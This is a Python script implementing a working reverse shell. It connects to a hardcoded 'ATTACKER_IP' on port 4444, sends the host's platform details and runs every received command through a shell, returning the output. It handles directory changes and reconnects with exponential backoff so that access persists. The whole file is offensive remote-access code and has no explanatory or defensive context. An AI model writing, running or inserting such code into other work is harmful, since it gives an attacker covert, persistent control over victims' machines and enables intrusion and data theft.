import socket
import subprocess
import time
import sys
import platform
import os

def reverse_shell(attacker_ip, attacker_port):
    retry_delay = 1
    current_dir = os.getcwd()  # Store current working directory

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            retry_delay = 1

            os_info = platform.platform()
            s.send(os_info.encode())

            while True:
                cmd = s.recv(4096).decode()
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    s.close()
                    sys.exit(0)

                # Handle "cd" manually
                if cmd.startswith("cd "):
                    path = cmd[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = f"Changed directory to {current_dir}"
                    except Exception as e:
                        output = f"cd failed: {e}"
                else:
                    try:
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=current_dir)
                        output = result.stdout + result.stderr
                    except Exception as e:
                        output = f"Command execution failed: {e}"

                if not output:
                    output = "[No output]\n"
                s.send(output.encode())

            s.close()

        except Exception:
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 60)

if __name__ == "__main__":
    ATTACKER_IP = "192.168.1.68"
    ATTACKER_PORT = 4444

    reverse_shell(ATTACKER_IP, ATTACKER_PORT)
